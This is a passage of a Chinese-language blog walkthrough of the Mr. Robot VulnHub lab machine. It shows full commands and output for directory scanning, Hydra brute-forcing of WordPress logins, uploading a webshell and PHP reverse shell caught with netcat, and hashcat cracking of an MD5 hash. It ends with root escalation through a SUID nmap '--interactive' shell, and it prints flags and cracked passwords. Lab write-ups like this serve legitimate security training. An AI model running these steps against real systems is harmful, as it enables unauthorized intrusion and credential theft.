class="line">START_TIME: Thu Jan  2 20:43:02 2020</span><br><span class="line">URL_BASE: http://192.168.56.107/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.107/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/0/                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/admin/                                                           </span><br><span class="line">+ http://192.168.56.107/atom (CODE:301|SIZE:0)                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/audio/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/blog/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/css/                                                             </span><br><span class="line">+ http://192.168.56.107/dashboard (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/favicon.ico (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/feed/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/Image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/images/                                                          </span><br><span class="line">+ http://192.168.56.107/index.html (CODE:200|SIZE:1188)                                               </span><br><span class="line">+ http://192.168.56.107/index.php (CODE:301|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/intro (CODE:200|SIZE:516314)                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/js/                                                              </span><br><span class="line">+ http://192.168.56.107/license (CODE:200|SIZE:309)                                                   </span><br><span class="line">+ http://192.168.56.107/login (CODE:302|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/page1 (CODE:301|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/phpmyadmin (CODE:403|SIZE:94)                                                 </span><br><span class="line">+ http://192.168.56.107/rdf (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/readme (CODE:200|SIZE:64)                                                     </span><br><span class="line">+ http://192.168.56.107/robots (CODE:200|SIZE:41)                                                     </span><br><span class="line">+ http://192.168.56.107/robots.txt (CODE:200|SIZE:41)                                                 </span><br><span class="line">+ http://192.168.56.107/rss (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/rss2 (CODE:301|SIZE:0)                                                        </span><br><span class="line">+ http://192.168.56.107/sitemap (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/sitemap.xml (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/video/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-admin/                                                        </span><br><span class="line">+ http://192.168.56.107/wp-config (CODE:200|SIZE:0)                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-content/                                                      </span><br><span class="line">+ http://192.168.56.107/wp-cron (CODE:200|SIZE:0)                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-includes/                                                     </span><br><span class="line">+ http://192.168.56.107/wp-links-opml (CODE:200|SIZE:227)                                             </span><br><span class="line">+ http://192.168.56.107/wp-load (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/wp-login (CODE:200|SIZE:2678)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-mail (CODE:500|SIZE:3064)                                                  </span><br><span class="line">+ http://192.168.56.107/wp-settings (CODE:500|SIZE:0)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-signup (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/xmlrpc (CODE:405|SIZE:42)                                                     </span><br><span class="line">+ http://192.168.56.107/xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure>
+<p>可以看到是wordpress的cms</p>
+<p>看一看robots.txt<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L3JvYm90cy50eHQ=">http://192.168.56.107/robots.txt<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>
+
+<p>此时第一个key已经有了<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L2tleS0xLW9mLTMudHh0">http://192.168.56.107/key-1-of-3.txt<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+
+<p>然后将fsocity.dic下载下来分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget http://192.168.56.107/fsocity.dic</span></span><br><span class="line">--2020-01-02 20:53:02--  http://192.168.56.107/fsocity.dic</span><br><span class="line">正在连接 192.168.56.107:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：7245381 (6.9M) [text/x-c]</span><br><span class="line">正在保存至: “fsocity.dic”</span><br><span class="line"></span><br><span class="line">fsocity.dic               100%[====================================&gt;]   6.91M  26.5MB/s  用时 0.3s    </span><br><span class="line"></span><br><span class="line">2020-01-02 20:53:02 (26.5 MB/s) - 已保存 “fsocity.dic” [7245381/7245381])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># file fsocity.dic </span></span><br><span class="line">fsocity.dic: , name offset 0x620a7574</span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocity.dic </span></span><br><span class="line">858160 fsocity.dic</span><br><span class="line">root@kali:~<span class="comment"># head fsocity.dic </span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">wikia</span><br><span class="line">from</span><br><span class="line">the</span><br><span class="line">now</span><br><span class="line">Wikia</span><br><span class="line">extensions</span><br><span class="line">scss</span><br><span class="line">window</span><br></pre></td></tr></table></figure>
+
+<p>这看起来像一个自定义单词列表，其中包含800k +个单词。但是，似乎有很多重复了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq | wc -l</span></span><br><span class="line">11451</span><br></pre></td></tr></table></figure>
+
+<p>将fsocity.dic去重</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq &gt; fsocityrm.dic</span></span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocityrm.dic</span></span><br><span class="line">11451 fsocityrm.dic</span><br></pre></td></tr></table></figure>
+
+<p>可以看到去重之后的字典只有11451条了，显然在这里安装了wordpress。 如果浏览到&#x2F;readme.html，可以看到使用的WordPress版本为4.3.9。要做的下一件事是在计算机上运行WpScan。 它揭示了几个过时的模块，但没有设法利用。<br>因此，决定专注于管理面板，并尝试强行爆破管理员账号密码。 第一步是找到有效的用户名。 不幸的是，该网站似乎没有任何帖子，因此没有作者信息出现。 WpScan也无法枚举用户。<br>幸运的是，有一个非常方便的工具叫做Hydra，它可以暴力破解几乎所有东西，包括HTTP格式的用户名。 这是尝试登录&#x2F;wp-login.php时发出的POST请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-login.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.107</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 101</span><br><span class="line">Origin: http://192.168.56.107</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.107/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;reauth=1</span><br><span class="line">Cookie: s_fid=6F117A4BEDFCBCE8-0646B35B635BEF6C; s_nr=1577958190705; s_cc=<span class="literal">true</span>; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>=user&amp;<span class="built_in">pwd</span>=pass&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;testcookie=1</span><br></pre></td></tr></table></figure>
+
+<p>使用hydra爆破，第一步，尝试找到用户名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L fsocityrm.dic -p wedontcare 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&quot;</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: Elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: ELLIOT   password: wedontcare</span><br></pre></td></tr></table></figure>
+<ul>
+<li>得到用户名是elliot，不区分大小写。</li>
+</ul>
+<p><font color="red">分解下各个参数的含义</font></p>
+<ul>
+<li>-vV : 输出详情</li>
+<li>-L fsocityrm.dic : 尝试fsocityrm.dic中的所有用户名</li>
+<li>-p wedontcare : 使用唯一的密码没关系（我们现在只对用户名感兴趣）</li>
+<li>192.168.56.107 : wordpress的ip地址</li>
+<li>http-post-form : 要尝试的暴力手段，这里是HTTP POST表单</li>
+<li>‘&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In:F&#x3D;Invalid username’<br>&#x2F;wp-login.php : 表单所在的路径<br>log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In : 要发送的POST参数。^USER^和^PASS^是占位符，将被替换为实际值。<br>F&#x3D;Invalid username : 如果响应包含文本无效的用户名，则将尝试视为失败（F）</li>
+</ul>
+<p>得到用户名之后用hydra爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l elliot -P fsocityrm.dic 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect.&quot; -t 64</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: ER28-0652</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到密码：ER28-0652</li>
+</ul>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg"></p>
+<p>将图片中的内容替换成冰蝎马，然后连接</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub127.jpg"></p>
+<p>上传php-reverse-shell，然后kali端监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.107/wp-content/themes/twentyfifteen/phpreverseshell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 52294</span><br><span class="line">Linux linux 3.13.0-55-generic <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 11:43:48 up  2:18,  0 <span class="built_in">users</span>,  load average: 0.00, 0.15, 0.42</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1(daemon) gid=1(daemon) <span class="built_in">groups</span>=1(daemon)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">daemon</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
+
+<p>成功弹回shell</p>
+<p>找到第二个key，但是权限不足</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">robot</span><br><span class="line">$ <span class="built_in">cd</span> robot</span><br><span class="line"><span class="built_in">cd</span> robot</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">$ <span class="built_in">cat</span> key-2-of-3.txt</span><br><span class="line"><span class="built_in">cat</span> key-2-of-3.txt</span><br><span class="line"><span class="built_in">cat</span>: key-2-of-3.txt: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>接着看看password.raw-md5有什么</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> password.raw-md5</span><br><span class="line"><span class="built_in">cat</span> password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure>
+
+<p>显然，它看起来像是未加盐的MD5哈希密码，使用HashCat进行破解应该很容易。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">$ ./hashcat64.exe -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the <span class="built_in">timeout</span>, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b</span><br><span class="line">Time.Started.....: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Time.Estimated...: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........: 54880.6 kH/s (2.68ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/14344385 (7.31%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; Leslee</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Fri Jan 03 11:57:03 2020</span><br><span class="line">Stopped: Fri Jan 03 11:57:11 2020</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub128.jpg"></p>
+<p>由于电脑的GPU配置超屌，所以密码一秒钟就出来了，是abcdefghijklmnopqrstuvwxyz</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
+
+<p>直接登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ su robot</span><br><span class="line">su robot</span><br><span class="line">Password: abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">robot@linux:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1002(robot) gid=1002(robot) <span class="built_in">groups</span>=1002(robot)</span><br><span class="line">robot@linux:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">robot</span><br></pre></td></tr></table></figure>
+
+<p>读取第二个key，帅呆了。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">robot@linux:~$ <span class="built_in">cat</span> key-2-of-3.txt</span><br><span class="line"><span class="built_in">cat</span> key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在MySQL数据库中没什么有趣的。 还有一个名为mich05654的WordPress用户，其密码为Dylan_2791，但似乎毫无用处。<br>经过一段时间的系统探索，发现了一个有趣的二进制文件，其SUID为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+
+<p>是的，是NMap本身！ 确切地说，它是旧版本（3.81）。 有趣的是，可执行文件由root拥有。 由于其SUID位置1，因此如果设法让nmap运行命令，则nmap理论上可以以root用户身份执行命令。<br>看一下nmap –help的输出，可以告诉我们nmap具有–interactive选项，可以产生某种REPL。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1002(robot) gid=1002(robot) euid=0(root) <span class="built_in">groups</span>=0(root),1002(robot)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>成功使用nmap提权，找到第3个key，挑战完成。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">firstboot_done  key-3-of-3.txt</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat firstboot_done</span></span><br><span class="line"><span class="built_in">cat</span> firstboot_done</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line"><span class="built_in">cat</span> key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>
+
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
